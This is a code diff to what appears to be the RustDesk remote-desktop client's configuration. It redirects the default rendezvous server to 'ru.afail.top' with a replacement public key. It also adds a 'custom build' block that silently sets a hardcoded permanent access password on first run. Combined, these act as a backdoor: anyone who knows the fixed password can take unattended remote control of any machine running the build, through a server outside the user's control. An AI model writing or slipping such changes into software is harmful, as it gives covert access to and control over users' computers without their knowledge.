@@ -114,8 +114,8 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
-pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
+pub const RENDEZVOUS_SERVERS: &[&str] = &["ru.afail.top"];
+pub const RS_PUB_KEY: &str = "wjXGMqxDNP7ZjaTlrjdXECZYBT16JCQQAdeA0FVlR7s=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
 pub const RELAY_PORT: i32 = 21117;
@@ -611,6 +611,15 @@ impl Config {
         let mut store = false;
         if let Err(err) = Self::validate_or_decrypt_permanent_password_storage(&mut config) {
             log::error!("Failed to validate or decrypt permanent password storage: {err}");
+        }
+        // Custom build: set default permanent password to a152535F on first run
+        if config.password.is_empty() {
+            Self::ensure_permanent_password_salt(&mut config);
+            let h1 = compute_permanent_password_h1("a152535F", &config.salt);
+            if let Some(storage) = encode_permanent_password_encrypted_storage_from_h1(&h1) {
+                config.password = storage;
+                store = true;
+            }
         }
         let mut id_valid = false;
         let (id, encrypted, store2) = decrypt_str_or_original(&config.enc_id, PASSWORD_ENC_VERSION);
